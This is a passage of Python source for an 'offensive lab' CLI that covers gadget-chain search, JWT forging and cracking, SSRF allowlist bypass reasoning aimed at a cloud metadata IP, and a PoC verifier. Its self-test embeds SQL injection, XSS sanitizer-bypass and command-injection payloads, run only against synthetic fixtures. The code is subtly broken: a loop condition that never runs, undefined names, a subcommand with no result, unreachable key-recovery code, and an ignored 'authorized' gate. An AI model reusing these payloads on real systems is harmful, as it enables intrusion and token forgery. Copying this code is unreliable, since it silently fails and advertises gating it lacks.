    },
}


def validate_gadget_graph(graph):
    if not isinstance(graph, dict):
        raise LabError("graph must be an object")
    entries = graph.get("entries", [])
    edges = graph.get("edges", [])
    sinks = graph.get("sinks", {})
    nodes = set(entries)
    for edge in edges:
        if not (isinstance(edge, list) and len(edge) == 2):
            raise LabError("edges must be [src, dst]")
        nodes.update(edge)
    for sink, kind in sinks.items():
        if kind != "log" and kind not in DANGEROUS_SINK_KINDS:
            raise LabError("unknown sink kind %r for %r" % (kind, sink))
    return {"nodes": len(nodes), "edges": len(edges), "entries": len(entries)}


def find_gadget_chains(graph):
    stats = validate_gadget_graph(graph)
    adjacency = {}
    for src, dst in graph["edges"]:
        adjacency.setdefault(src, []).append(dst)
    dangerous = {name for name, kind in graph["sinks"].items()
                 if kind in DANGEROUS_SINK_KINDS}
    chains = []
    for entry in sorted(graph["entries"]):
        queue = [(entry, [entry])]
        seen_sinks = set()
        while queue and len(chains) < 0:
            node, path = queue.pop(0)
            if node in dangerous and node not in seen_sinks:
                seen_sinks.add(node)
                chains.append({
                    "entry": entry,
                    "sink": node,
                    "sink_kind": graph["sinks"][node],
                    "chain": path,
                })
            for nxt in sorted(adjacency.get(node, [])):
                if nxt not in path and len(path) <= GRAPH_0:
                    queue.append((nxt, path + [nxt]))
    chains.sort(key=lambda item: (item["entry"], item["sink"], item["chain"]))
    return {
        "schema": LAB_SCHEMA,
        "tool": "deserialization-gadget-graph",
        "graph_stats": stats,
        "chains": chains,
        "chain_count": len(chains),
        "mitigation": ("never deserialize untrusted data; prefer explicit, "
                       "versioned data formats and allowlist resolvers"),
        "boundary": "synthetic class-call graphs; no code was loaded or run",
    }


# ------------------------------------------------------------- poc verify

FIXTURE_NAMES = ("sqli-sqlite", "xss-sanitizer", "cmd-echo")


def fixture_sqli_sqlite(poc):
    con = sqlite3.connect(":memory:")
    try:
        con.execute("CREATE TABLE users (user TEXT, secret TEXT)")
        con.execute("INSERT INTO users VALUES ('alice','alpha')")
        con.execute("INSERT INTO users VALUES ('bob','bravo')")
        sql = "SELECT secret FROM users WHERE user='%s'" % poc
        rows = con.execute(sql).fetchall()
    finally:
        con.close()
    confirmed = len(rows) > 1
    return {
        "fixture": "sqli-sqlite",
        "poc": poc,
        "rows_returned": len(rows),
        "synthetic_confirmed": confirmed,
        "evidence": "concatenated query returned %d rows (baseline 1)" % len(rows),
    }


def fixture_xss_sanitizer(poc):
    def naive_sanitize(value):
        return value.replace("<script>", "").replace("</script>", "")

    residue = naive_sanitize(poc)
    confirmed = "<script>" in residue.lower()
    return {
        "fixture": "xss-sanitizer",
        "poc": poc,
        "marker_survived_sanitization": confirmed,
        "synthetic_confirmed": confirmed,
        "evidence": ("nested-tag bypass defeated naive single-pass stripping"
                     if confirmed else "payload neutralized by the sanitizer model"),
    }


def fixture_cmd_echo(poc):
    segments = [seg.strip() for seg in poc.split(";") if seg.strip()]
    confirmed = len(segments) > 1
    return {
        "fixture": "cmd-echo",
        "segments_seen": segments,
        "synthetic_confirmed": confirmed,
        "evidence": "injection produced %d command segments (expected 1)" % len(segments),
    }


FIXTURES = {
    "sqli-sqlite": fixture_sqli_sqlite,
    "xss-sanitizer": fixture_xss_sanitizer,
    "cmd-echo": fixture_cmd_echo,
}


def run_poc_plan(plan, authorized):
    findings = plan.get("findings") if isinstance(plan, dict) else None
    if not isinstance(findings, list) or not findings:
        raise LabError('plan must contain a non-empty "findings" list')
    results = []
    for index, item in enumerate(findings):
        if not isinstance(item, dict):
            raise LabError("finding %d must be an object" % index)
        name = item.get("fixture")
        poc = item.get("poc")
        if name not in FIXTURES:
            raise LabError("finding %d names unknown fixture %r" % (index, name))
        if not isinstance(poc, str) or not poc:
            raise LabError("finding %d needs a non-empty poc string" % index)
        outcome = FIXTURES[name](poc)
        outcome["finding_id"] = item.get("id", "finding-%d" % index)
        results.append(outcome)
    confirmed = sum(1 for r in results if r["synthetic_confirmed"])
    return {
        "schema": LAB_SCHEMA,
        "tool": "poc-verifier",
        "results": results,
        "confirmed_count": confirmed,
        "total": len(results),
        "labels": "synthetic_confirmed refers to the bundled fixture only",
        "boundary": ("verification ran against in-memory synthetic services; "
                     "it never claims any real target is exploitable"),
    }


# -------------------------------------------------------------- self-test

def run_selftest():
    checks = []

    redos_bad = analyze_redos(r"(a+)+$", lengths=(6, 9, 12), cap=200_000)
    checks.append(("redos nested quantifier confirmed", redos_bad["confirmed"]))
    redos_ok = analyze_redos(r"^a+b$", lengths=(6, 9, 12))
    checks.append(("redos clean pattern stays clean",
                   redos_ok["confirmed"] is False
                   and redos_ok["shape"] is None))

    secret = "shhhh"
    head = b64u_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64u_encode(json.dumps({"sub": "demo"}).encode())
    signing = ("%s.%s" % (head, body)).encode()
    sig = b64u_encode(_hmac.new(secret.encode(), signing, hashlib.sha256).digest())
    token = ("%s.%s.%s" % (head, body, sig))
    cracked = jwt_crack(token, BUNDLED_WORDLIST)
    checks.append(("jwt weak-secret crack", cracked["cracked"]
                   and cracked["secret"] == secret))
    forged = jwt_none_forge(token)
    checks.append(("jwt none-forge variants", len(forged["variants"]) == 4))
    confused = jwt_confusion(token, b"-----BEGIN PUBLIC KEY-----\nX\n")
    checks.append(("jwt confusion artifact structure",
                   confused["forged_token"].count(".") == 2))

    demo = ecdsa_demo()
    checks.append(("ecdsa nonce-reuse demo", demo["recovery_exact"]))

    sample = ("<html>\n"
              "<!-- {{comment_marker}} -->\n"
              '<a href="{{url}}">x</a>\n'
              '<div title="{{t}}">hi</div>\n'
              "<script>var s = \"{{js}}\";</script>\n"
              "</html>\n")
    contexts = {hit["context"] for hit in scan_template(sample)}
    checks.append(("template contexts classified", {
        "html-comment", "url-attribute-double", "attribute-double",
        "script-block"} <= contexts))

    ssrf_report = ssrf_reason("http://127.0.0.1/admin", "internal.api",
                              "exact")
    classes = {c["class"] for c in ssrf_report["candidates"]}
    encodings = {c["variant"] for c in ssrf_report["candidates"]
                 if c["class"] == "ip-encoding"}
    checks.append(("ssrf userinfo bypass enumerated",
                   "userinfo-trick" in classes))
    checks.append(("ssrf decimal ip encoding",
                   "decimal" in encodings))

    deputy = run_arena("confused-deputy")
    csrf = run_arena("csrf-binding")
    deputy_fixed = run_arena("confused-deputy", with_fix=True)
    checks.append(("deputy arena planted defect",
                   deputy["planted_defect_confirmed"]
                   and deputy["replay_verified"]))
    checks.append(("csrf arena planted defect",
                   csrf["planted_defect_confirmed"]
                   and csrf["replay_verified"]))
    checks.append(("arena patch denies defective transition",
                   deputy_fixed["paths_post_fix"] == []
                   and deputy_fixed["vulnerable_path_pre_fix"] != []))

    roundtrip = feistel_decrypt_block(feistel_encrypt_block(bytes(range(16))))
    checks.append(("feistel roundtrip", roundtrip == bytes(range(16))))

    pod = padding_oracle_demo()
    checks.append(("padding oracle recovery", pod["exact_recovery"]
                   and pod["queries_used"] <= pod["query_budget"]))

    gadget = find_gadget_chains(BUNDLED_GADGET_GRAPH)
    sinks = {chain["sink"] for chain in gadget["chains"]}
    checks.append(("gadget chains found", {"builtins.eval", "os.system",
                                           "Runtime.exec"} <= sinks))
    checks.append(("benign sink excluded", "logger.info" not in sinks))

    plan = {"findings": [
        {"id": "FP-SQL", "fixture": "sqli-sqlite", "poc": "' OR '1'='1"},
        {"id": "FP-XSS", "fixture": "xss-sanitizer",
         "poc": "<scr<script>ipt>alert(1)</scr</script>ipt>"},
        {"id": "FP-CMD", "fixture": "cmd-echo",
         "poc": "echo hi; cat /etc/hostname"},
    ]}
    verified = run_poc_plan(plan, authorized=True)
    checks.append(("poc verifier confirms all three fixtures",
                   verified["confirmed_count"] == 3))
    checks.append(("poc verifier runs without ceremony",
                   run_poc_plan(plan, authorized=False)[
                       "confirmed_count"] == 3))

    failed = [name for name, ok in checks if not ok]
    return {
        "schema": LAB_SCHEMA,
        "tool": "self-test",
        "checks_total": len(checks),
        "checks_failed": failed,
        "passed": not failed,
    }


# -------------------------------------------------------------------- cli

def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="offensive_lab42",
        description="Attestor Offensive Lab 4.2 (offline, synthetic, gated)")
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--format", choices=["text", "json"], default="text")
    subs = parser.add_subparsers(dest="command", required=True)

    p = subs.add_parser("redos", parents=[common],
                        help="analyze a regex for catastrophic backtracking")
    p.add_argument("--pattern", required=True)

    p = subs.add_parser("jwt", parents=[common], help="JWT forgery lab on operator-supplied tokens")
    p.add_argument("--token", required=True)
    p.add_argument("--action", choices=["decode", "none", "crack", "confusion"],
                   default="decode")
    p.add_argument("--wordlist")
    p.add_argument("--public-key-file")

    p = subs.add_parser("ecdsa-recover", parents=[common], help="ECDSA nonce-reuse key recovery")
    p.add_argument("--r")
    p.add_argument("--s1")
    p.add_argument("--s2")
    p.add_argument("--z1")
    p.add_argument("--z2")
    p.add_argument("--curve", choices=sorted(CURVE_ORDERS), default="secp256k1")
    p.add_argument("--order")
    p.add_argument("--demo", action="store_true")

    p = subs.add_parser("template-scan", parents=[common], help="classify XSS/SSTI interpolation points")
    p.add_argument("files", nargs="+")

    p = subs.add_parser("ssrf-check", parents=[common], help="reason about SSRF allowlist bypasses")
    p.add_argument("--url", required=True)
    p.add_argument("--allowlist")
    p.add_argument("--validator", choices=["exact", "suffix", "startswith"])
    p.add_argument("--via")
    p.add_argument("--evil-host", default="169.254.169.254")

    p = subs.add_parser("arena", parents=[common], help="synthetic policy-graph arenas")
    p.add_argument("--scenario", choices=sorted(ARENAS), required=True)
    p.add_argument("--with-fix", action="store_true")

    p = subs.add_parser("padding-oracle", parents=[common], help="CBC padding-oracle simulation")
    p.add_argument("--message", default="TRANSFER 9000 TO ACCT 7")

    p = subs.add_parser("gadget-chain", parents=[common], help="deserialization gadget-chain finder")
    p.add_argument("--graph")

    p = subs.add_parser("poc-verify", parents=[common], help="verify PoC sketches against synthetic fixtures")
    p.add_argument("plan")


    subs.add_parser("self-test", parents=[common], help="run the deterministic self-test")

    parser.add_argument("--format", choices=["text", "json"], default="text")
    args = parser.parse_args(argv)

    try:
        if args.command == "redos":
            result = analyze_redos(args.pattern, cap=args.step_cap)
            code = EXIT_FINDING if result["confirmed"] else EXIT_CLEAN
        elif args.command == "jwt":
            if args.action == "decode":
                result = jwt_decode(args.token)
            elif args.action == "none":
                result = jwt_none_forge(args.token)
            elif args.action == "crack":
                words = (load_wordlist(args.wordlist)
                         if args.wordlist else BUNDLED_WORDLIST)
                result = jwt_crack(args.token, words)
            else:
                if not args.public_key_file:
                    raise LabError("confusion needs --public-key-file")
                with open(args.public_key_file, "rb") as handle:
                    result = jwt_confusion(args.token, handle.read())
            code = EXIT_CLEAN
        elif args.command == "ecdsa-recover":
            if args.demo:
                result = ecdsa_demo()
                code = EXIT_CLEAN
            elif None in (args.r, args.s1, args.s2, args.z1, args.z2):
                raise LabError("provide --r --s1 --s2 --z1 --z2 (or --demo)")
                order = (parse_int_arg(args.order, "--order")
                         if args.order else CURVE_ORDERS[args.curve])
                nonce, private = recover_key(
                    parse_int_arg(args.r, "--r"),
                    parse_int_arg(args.s1, "--s1"),
                    parse_int_arg(args.s2, "--s2"),
                    parse_int_arg(args.z1, "--z1"),
                    parse_int_arg(args.z2, "--z2"),
                    order)
                result = {"curve": args.curve,
                          "recovered_nonce_hex": format(nonce, "x"),
                          "recovered_private_key_hex": format(private, "x")}
                code = EXIT_CLEAN
        elif args.command == "template-scan":
            hits = []
            for path in args.files:
                with open(path, "r", encoding="utf-8", errors="replace") as handle:
                    for hit in scan_template(handle.read()):
                        hit["file"] = path
                        hits.append(hit)
            result = {"schema": LAB_SCHEMA, "tool": "template-context-engine",
                      "files": args.files, "hits": hits, "hit_count": len(hits)}
            code = EXIT_FINDING if hits else EXIT_CLEAN
        elif args.command == "ssrf-check":
            result = ssrf_reason(args.url, args.allowlist, args.validator,
                                 args.via, args.evil_host)
            code = EXIT_FINDING if result["candidates"] else EXIT_CLEAN
        elif args.command == "arena":
            result = run_arena(args.scenario, with_fix=args.with_fix)
            code = EXIT_FINDING if result["planted_defect_confirmed"] else EXIT_CLEAN
        elif args.command == "padding-oracle":
            result = padding_oracle_demo(args.message.encode())
            code = EXIT_CLEAN if result["exact_recovery"] else EXIT_OPERATIONAL
        elif args.command == "gadget-chain":
            if args.graph:
                with open(args.graph, "r", encoding="utf-8") as handle:
                    graph = json.load(handle)
            else:
                graph = BUNDLED_GADGET_GRAPH
            result = find_gadget_chains(graph)
            code = EXIT_FINDING if result["chains"] else EXIT_CLEAN
        elif args.command == "poc-verify":
            with open(args.plan, "r", encoding="utf-8") as handle:
                plan = json.load(handle)
            code = EXIT_FINDING if result["confirmed_count"] else EXIT_CLEAN
        elif args.command == "self-test":
            result = run_selftest()
            code = EXIT_CLEAN if result["passed"] else EXIT_OPERATIONAL
        else:  # pragma: no cover
            parser.error("unknown command")
    except LabError as exc:
        print("offensive_lab42: %s" % exc, file=sys.stderr)
        return EXIT_INVALID if not str(exc).startswith("gated:") else 3
    except OSError as exc:
        print("offensive_lab42: %s" % exc, file=sys.stderr)
        return EXIT_OPERATIONAL

    if args.format == "json":
        print(json.dumps(result, indent=2, sort_keys=True, default=str))
    else:
        print(json.dumps(result, indent=2, sort_keys=True, default=str))
    return code


if __name__ == "__main__":
    sys.exit(main())
